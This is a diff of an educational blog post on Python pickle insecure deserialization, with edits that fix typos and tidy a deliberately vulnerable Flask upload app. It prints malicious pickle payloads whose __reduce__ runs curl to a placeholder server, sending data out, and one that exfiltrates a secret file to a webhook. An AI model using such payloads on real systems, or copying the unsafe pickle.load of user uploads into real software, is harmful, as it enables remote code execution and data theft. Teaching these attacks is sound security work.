@@ -37,10 +37,10 @@ Context What Even is Serialization? My CPSC210 class I learned the fundamentals 
 
 <p>The serialization process is a key component to ensure that all the parts of a system are working together and seamlessly, operating in all sorts of different formats but still managing to easily convert data from some base byte stream into a workable object for their use. But it&rsquo;s not without its own flaws. In many cases, it&rsquo;s not totally lossless.</p>
 <h3 id="backup-directives">Backup Directives</h3>
-<p>When serializing objects, one thing to note is that some properties or connections will not completely transfer over during the process. In that case, there should be some sort of backup plan or emergency what-to-do in those situations. This blueprint will vary from language to language, but often you&rsquo;ll see it as some directive that tells the deserializer what to do when it encounters a foreign property. As an example, Python&rsquo;s <a href="https://docs.python.org/3/library/pickle.html">pickle</a> module - the native serializaing library in Python - uses a magic function called <code>__reduce__()</code> to stipulate what should be done in case not everything was perfectly translated from their bytestream form.</p>
+<p>When serializing objects, one thing to note is that some properties or connections will not completely transfer over during the process. In that case, there should be some sort of backup plan or emergency what-to-do in those situations. This blueprint will vary from language to language, but often you&rsquo;ll see it as some directive that tells the deserializer what to do when it encounters a foreign property. As an example, Python&rsquo;s <a href="https://docs.python.org/3/library/pickle.html">pickle</a> module - the native serializing library in Python - uses a magic function called <code>__reduce__()</code> to stipulate what should be done in case not everything was perfectly translated from their bytestream form.</p>
 <p><code>__reduce__()</code> in particular tells the pickle module how to handle things directly within the definition of the class. Specifying this interface will allow us to manually reconstruct potentially complicated properties, such as database connections or open file handles. Of course, there exist unintended ways of using the <code>__reduce__()</code> directive.</p>
 <h2 id="insecure-deserialization">Insecure Deserialization</h2>
-<p>Serialization is not inherently bad, and it is a very important tool in many infrastructures today. What makes it vulnerable is, like with many different practises, improper handling of its inputs. Insecure deserialization typically arises when applications feed user input into their deserializers, which wasn&rsquo;t properly cleaned/sanitized.</p>
+<p>Serialization is not inherently bad, and it&rsquo;s a very important tool in many infrastructures today. What makes it vulnerable is, like with many different practises, improper handling of its inputs. Insecure deserialization typically arises when applications feed user input into their deserializers, which wasn&rsquo;t properly cleaned/sanitized.</p>
 <p>Refer back to Python&rsquo;s pickle module once more. It uses the <code>__reduce__()</code> directive for edge cases where properties are not properly reconstructed from their stream form. However, if the input that you&rsquo;re giving your pickler is from some external user, you lay yourself bare for RCE.</p>
 <p><code>__reduce__()</code> can be used to stipulate potentially dangerous commands, such as opening a reverse shell to a server you control. This is, unfortunately, necessary functionality for the pickle module to have in order to operate smoothly. Consider the following example:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> pickle
@@ -61,24 +61,19 @@ my_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.
 <p><em>(Some parts omitted)</em></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> pickle
 <span style="color:#f92672">import</span> os
-<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
-<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request, redirect, url_for
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, redirect, url_for
 <span style="color:#f92672">from</span> werkzeug.utils <span style="color:#f92672">import</span> secure_filename
-
-
 
 app <span style="color:#f92672">=</span> Flask(__name__)
 UPLOAD_FOLDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/directory/to/webserver&#39;</span>
 
 app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>] <span style="color:#f92672">=</span> UPLOAD_FOLDER
 
-temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-
 <span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">notes_post</span>():
     <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
         <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">        &lt;!doctype html&gt;
+</span><span style="color:#e6db74">        &lt;!doctype HTML&gt;
 </span><span style="color:#e6db74">        &lt;title&gt;Upload new File&lt;/title&gt;
 </span><span style="color:#e6db74">        &lt;h1&gt;Upload new File&lt;/h1&gt;
 </span><span style="color:#e6db74">        &lt;form method=post enctype=multipart/form-data&gt;
@@ -93,10 +88,6 @@ temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;
         filename <span style="color:#f92672">=</span> secure_filename(file<span style="color:#f92672">.</span>filename)
         file<span style="color:#f92672">.</span>save(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>], filename))
 
-        os<span style="color:#f92672">.</span>listdir(UPLOAD_FOLDER)
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;?&#34;</span>)
-        
-
         <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;thaaanks!&#34;</span>
 
 <span style="color:#f92672">...</span>
@@ -105,14 +96,13 @@ temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">note</span>():
     my_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>load(filename, <span style="color:#e6db74">&#34;rb&#34;</span>)
 
-    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;this is a note :)&#34;</span>
-</code></pre></div><p>I made this toy application to explain this process. The expected application flow is that our program is going to take a file defined by the user and store it in the webserver. For ease of use and convenience, the application &ldquo;assumes&rdquo; that the files provided by the user are able to be unpickled. You can request for an object back, and when you do so, it gets de-serialized.</p>
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;your file was succesfully deserialized~&#34;</span>
+</code></pre></div><p>I made this toy application to explain this process. The expected application flow is that our program is going to take a file defined by the user and store it in the webserver. For ease of use and convenience, the application <em>assumes</em> that the files provided by the user are able to be deserialized. You can request for an object back, and when you do so, it gets deserialized.</p>
 
     <img src="/images/InsecureDeserializationIntro_fileUpload.png"  alt="secret"  class="center"  style="border-radius: 8px;"  />
 
 
-<p>So, the expected input is any sort of valid object file provided by the user. When requested for the file, it will get deserialized.</p>
-<p>So what happens when we provide it a file generated from this script?</p>
+<p>So, the expected input is any sort of user-provided file. What happens when we provide it a file generated from this script?</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>(object):
 	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
 		<span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;curl http://your.server.HERE --data </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">hello</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, ))
@@ -138,7 +128,7 @@ EvilExample <span style="color:#f92672">=</span> Secret()
 pickle<span style="color:#f92672">.</span>dump(EvilExample, open(<span style="color:#e6db74">&#34;secret.p&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>))
 </code></pre></div><p>Let&rsquo;s say that there&rsquo;s a file called <code>secret.txt</code> in the directory of the application that looks like so:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">this is a secret~
-</code></pre></div><p>When we submit the generated file from this script (<code>secret.p</code>) and request for it, we can see in our webhook that the contents of <code>secret.txt</code> have succesfully been sent to us in the body of a POST request:</p>
+</code></pre></div><p>When we submit the generated file from this script (<code>secret.p</code>) and request for it, we can see in our webhook that the contents of <code>secret.txt</code> have succesfully been outpuuted to us in the body of a POST request:</p>
 
     <img src="/images/InsecureDeserializationIntro_secret.png"  alt="secret"  class="center"  style="border-radius: 8px;"  />
 
